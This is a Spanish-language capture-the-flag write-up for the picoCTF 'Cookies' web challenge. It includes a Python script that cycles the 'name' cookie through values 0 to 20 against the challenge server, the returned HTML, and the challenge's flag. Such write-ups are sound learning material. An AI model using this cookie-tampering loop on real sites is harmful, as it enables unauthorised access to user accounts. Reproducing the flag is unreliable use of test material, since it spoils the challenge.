
## Descripción:
	Who doesn't love cookies? Try to figure out the best one. [http://mercury.picoctf.net:29649/](http://mercury.picoctf.net:29649/)

## Solución:

Hice el uso de la librería requests para enviar solicitudes HTTP a la pagina dada  y buscar el texto (`picoCTF`) en la respuesta.
### Código Python:
```
import requests

url = "http://mercury.picoctf.net:29649/"

for i in range(21):
    cookies = {'name': '{}'.format(i)}
    r = requests.get(url, cookies=cookies)
    
    if 'picoCTF' in r.text:
        print(r.text) 
```

### Salida de consola:
```
Krykoso-picoctf@webshell:~$ python3 exp.py 
<!DOCTYPE html>
<html lang="en">

<head>
    <title>Cookies</title>


    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" rel="stylesheet">

    <link href="https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css" rel="stylesheet">

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>

</head>

<body>

    <div class="container">
        <div class="header">
            <nav>
                <ul class="nav nav-pills pull-right">
                    <li role="presentation"><a href="/reset" class="btn btn-link pull-right">Home</a>
                    </li>
                </ul>
            </nav>
            <h3 class="text-muted">Cookies</h3>
        </div>

        <div class="jumbotron">
            <p class="lead"></p>
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_a1f5bdb7}</code></p>
        </div>


        <footer class="footer">
            <p>&copy; PicoCTF</p>
        </footer>

    </div>
</body>

</html>
```


### Bandera
	picoCTF{3v3ry1_l0v3s_c00k135_a1f5bdb7}